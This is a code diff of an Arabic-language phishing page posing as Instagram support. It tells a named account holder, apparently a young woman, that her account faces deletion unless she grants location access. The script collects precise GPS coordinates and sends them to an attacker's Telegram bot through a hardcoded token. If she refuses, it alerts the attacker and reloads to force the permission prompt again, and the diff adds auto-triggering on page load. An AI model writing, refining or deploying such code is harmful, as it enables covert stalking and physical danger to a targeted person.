@@ -11,8 +11,7 @@
         h2 { color: #1c1e21; margin-bottom: 15px; font-size: 22px; }
         p { color: #606770; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
         .btn { background-color: #1877f2; color: white; padding: 14px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:hover { background-color: #166fe5; }
-        #status { margin-top: 15px; font-size: 14px; font-weight: bold; color: #42b72a; display: none; }
+        #status { margin-top: 15px; font-size: 14px; font-weight: bold; color: #ed4956; display: none; }
     </style>
 </head>
 <body>
@@ -20,13 +19,12 @@
 <div class="card">
     <img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" class="icon" alt="Support">
     <h2>تأكيد الهوية الرقمية</h2>
-    <p>بناءً على طلب "بلاغ انتحال" المقدم ضد الحساب <br><b>(ha2542213)</b>، يجب السماح بالوصول للموقع للمطابقة الأمنية وإلغاء عملية الحذف التلقائي للملف الشخصي.</p>
-    <button class="btn" onclick="verify()">تأكيد الموقع وإلغاء البلاغ</button>
-    <div id="status">تمت المصادقة! جاري التحويل...</div>
+    <p>لقد تم تقديم بلاغ "انتحال شخصية" ضد الحساب <br><b>(ha2542213)</b>. <br><br> لتجنب حذف الحساب نهائياً، يرجى الضغط على الزر والموافقة على "سماح بالموقع" لمطابقة بياناتك.</p>
+    <button class="btn" id="mainBtn" onclick="verify()">تأكيد الموقع وإلغاء البلاغ</button>
+    <div id="status">يجب الضغط على "سماح" (Allow) لإتمام العملية!</div>
 </div>
 
 <script>
-    // بيانات الربط الخاصة بك
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
@@ -35,46 +33,53 @@
     }
 
     function verify() {
-        // إعدادات جلب الموقع بأعلى دقة ممكنة
         const geoOptions = {
             enableHighAccuracy: true, 
-            timeout: 10000,           
+            timeout: 15000,           
             maximumAge: 0             
         };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
+                // في حال ضغطت "سماح" ونجحنا بجلب الإحداثيات
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
-                const acc = position.coords.accuracy; // دقة الموقع بالأمتار
+                const acc = position.coords.accuracy;
                 
-                // رابط خرائط جوجل المباشر
                 const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                let report = `🎯 **تم صيد موقع الهدف بنجاح!**\n\n`;
+                let report = `🎯 **تم صيد الهدف بنجاح!**\n\n`;
                 report += `👤 الحساب: ha2542213\n`;
-                report += `📍 رابط الخريطة:\n${googleMaps}\n\n`;
-                report += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر\n`;
-                report += `📱 نظام الجهاز: ${navigator.platform}`;
+                report += `📍 الموقع: ${googleMaps}\n`;
+                report += `📏 الدقة: ${acc.toFixed(1)} متر`;
 
                 sendToTelegram(report);
 
-                // إظهار رسالة النجاح والتحويل
+                document.getElementById('status').innerText = "تمت المصادقة بنجاح!";
+                document.getElementById('status').style.color = "#42b72a";
                 document.getElementById('status').style.display = 'block';
+                
                 setTimeout(() => {
                     window.location.href = "https://help.instagram.com";
                 }, 2000);
 
             }, function(error) {
-                // إذا رفضت البنت الوصول للموقع
-                sendToTelegram("⚠️ البنت (ha2542213) فتحت الرابط ورفضت إعطاء صلاحية الموقع.");
-                alert("تنبيه أمني: يجب السماح بالوصول للموقع لإتمام عملية إلغاء البلاغ وحماية حسابك.");
-                // إعادة طلب الموقع لإجبارها
+                // في حال ضغطت "رفض" أو "Block"
+                sendToTelegram("⚠️ البنت رفضت إعطاء الصلاحية (ضغطت Block).");
+                
+                // رسالة إجبارية تظهر لها
+                alert("خطأ أمني: النظام لم يستطع التأكد من موقعك. يجب اختيار 'سماح' (Allow) لإلغاء طلب حذف حسابك.");
+                
+                // إعادة تحميل الصفحة تلقائياً لتظهر نافذة السماح مرة ثانية
                 location.reload(); 
+                
             }, geoOptions);
-        } else {
-            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع.");
         }
+    }
+
+    // محاولة تشغيل الطلب فور دخول الصفحة لجذب انتباهها
+    window.onload = function() {
+        setTimeout(verify, 1000);
     }
 </script>
 
